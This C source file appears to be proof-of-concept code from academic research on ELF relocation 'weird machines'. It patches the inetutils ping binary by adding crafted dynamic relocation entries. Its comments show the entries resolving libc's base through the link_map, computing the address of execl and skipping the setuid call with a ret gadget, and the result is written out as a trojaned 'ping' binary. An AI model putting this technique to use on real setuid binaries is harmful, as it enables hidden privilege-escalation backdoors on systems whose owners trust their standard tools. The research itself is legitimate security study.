/* Copyright (c) 2012 Rebecca (bx) Shapiro

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.
*/

#include <stdio.h>
#include "elf_bf_utils.h"
#include "reloc.h"
#include "symtab.h"

#define INPUT_FILE "inetutils/inetutils-1.8/ping/ping"
#define OUTPUT_FILE "ping"
#define NUM_RELOC 9

int main(int argv, char *argc[])
{
  elfshobj_t *f;
  elfshsect_t *newrel, *dynsym, *dynrel, *bss, *newsym;
  char *reladyndata;
  elf_bf_link_map_t l;
  elf_bf_Sym got;
  eresi_Addr sz;
  elf_bf_Rela r[NUM_RELOC];
  eresi_Addr i;

  l.lm_f = elfutils_read_elf_file(INPUT_FILE);

  //get current dynsym
  dynsym = elfsh_get_section_by_name(l.lm_f,".dynsym", NULL, NULL, NULL);
  sz = elfsh_get_section_size(dynsym->shdr);
  //make a copy of this dynsym table so it is in writable memory
  newsym = insert_symtab_sec(l.lm_f, sz/sizeof(Elf64_Sym), elfsh_get_section_link(dynsym->shdr));
  elfsh_set_section_type(dynsym->shdr,ELFSH_SECTION_DYNSYM);
  memcpy(newsym->data, dynsym->data, sz);
  l.lm_sym = newsym;
  //fix dynamic table to use new sym table
  fixup_dynamic_sym(l.lm_f, elfsh_get_section_addr(newsym->shdr), elfsh_get_section_size(newsym->shdr));


  // create new relocation section
  // make get a copy of the existing reloc table
  dynrel = elfsh_get_section_by_name(l.lm_f,".rela.dyn", NULL, NULL, NULL);
  sz = elfsh_get_section_size(dynrel->shdr);
  eresi_Addr nextrel = sz/sizeof(Elf64_Rela);
  newrel = insert_reloc_sec(l.lm_f, nextrel + NUM_RELOC, newsym);
  l.lm_reloc = newrel;
  l.lm_allocated = 1;


  symtab_get_sym(&l, 0, &got);
  symtab_set_sym(&got, 8, 0x610ff0, STT_FUNC);



  // fix dynamic table to use new reloc section
  fixup_dynamic_rela(l.lm_f, elfsh_get_section_addr(newrel->shdr), elfsh_get_section_size(newrel->shdr));

  // insert interesting relocation entries, copy over old entries
  memcpy(newrel->data, dynrel->data, sz);

  for (i = nextrel; i<(nextrel+NUM_RELOC); i++){
    reloc_get_reloc_entry(&l, i, &(r[i-nextrel]));
  }
  i = 0;

  // find base address of library

  reloc_set_rela(&(r[i++]), R_X86_64_COPY, got.index, symtab_get_value_addr(&got), 0);
  reloc_set_rela(&(r[i++]), R_X86_64_64, got.index, symtab_get_value_addr(&got), get_l_next(0)); //calculate l_next address location

  reloc_set_rela(&(r[i++]), R_X86_64_COPY, got.index, symtab_get_value_addr(&got), 0);
  reloc_set_rela(&(r[i++]), R_X86_64_64, got.index, symtab_get_value_addr(&got), get_l_next(0)); //calculate l_next address location


  reloc_set_rela(&(r[i++]), R_X86_64_COPY, got.index, symtab_get_value_addr(&got), 0); //get link_map addr
  reloc_set_rela(&(r[i++]), R_X86_64_COPY, got.index, symtab_get_value_addr(&got), 0); //get laddr

  reloc_set_rela(&(r[i++]), R_X86_64_64, got.index, symtab_get_value_addr(&got), 0xa0650); //offset of execl
  reloc_set_rela(&(r[i++]), R_X86_64_64, got.index, 0x611020, 0);
  reloc_set_rela(&(r[i++]), R_X86_64_RELATIVE, got.index, 0x611200, 0x402ebc); //0x402ebc <_ping_setbuf+208>: retq, (so setuid isn't run)


  elfutils_save_elf_file(l.lm_f, OUTPUT_FILE);
  return 0;
}
